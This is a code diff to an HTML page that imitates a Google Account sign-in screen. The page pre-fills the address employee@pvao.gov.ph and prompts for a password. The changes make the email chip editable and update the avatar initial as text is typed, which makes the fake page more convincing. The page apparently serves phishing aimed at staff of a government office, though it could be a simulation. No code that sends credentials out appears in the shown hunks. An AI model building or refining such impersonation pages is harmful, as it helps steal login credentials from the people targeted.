@@ -269,11 +269,17 @@
       <h1>Welcome back</h1>
       <p class="subtitle">Sign in to your Google Account</p>
       
-      <div class="email-chip">
-        <div class="avatar">E</div>
+      <div class="email-chip" id="email-chip" onclick="editEmail()">
+        <div class="avatar" id="email-avatar">E</div>
         <span class="email-text" id="email-display"></span>
-        <span class="chevron">▾</span>
+        <span class="chevron">&#9662;</span>
       </div>
+
+<!-- hidden input that appears on click -->
+<div class="input-group" id="email-input-group" style="display:none;">
+  <input type="email" id="email-input" placeholder=" " />
+  <label for="email-input">Email or phone</label>
+</div>
 
       <p class="hint">Enter your password</p>
 
@@ -342,10 +348,28 @@
   </div>
 
  <script>
-    // Email
+   // Set default email in chip
     var user = 'employee';
     var domain = 'pvao.gov.ph';
-    document.getElementById('email-display').textContent = user + '@' + domain;
+    var defaultEmail = user + '@' + domain;
+    document.getElementById('email-display').textContent = defaultEmail;
+    
+    // Click chip to edit
+    function editEmail() {
+      document.getElementById('email-chip').style.display = 'none';
+      var inputGroup = document.getElementById('email-input-group');
+      inputGroup.style.display = 'block';
+      var input = document.getElementById('email-input');
+      input.value = defaultEmail;
+      input.focus();
+    
+      // Update avatar initial as they type
+      input.addEventListener('input', function() {
+        var val = input.value;
+        var initial = val.charAt(0).toUpperCase() || 'E';
+        document.getElementById('email-avatar').textContent = initial;
+      });
+    }
 
     // URL display
     document.getElementById('url-display').textContent = window.location.href;
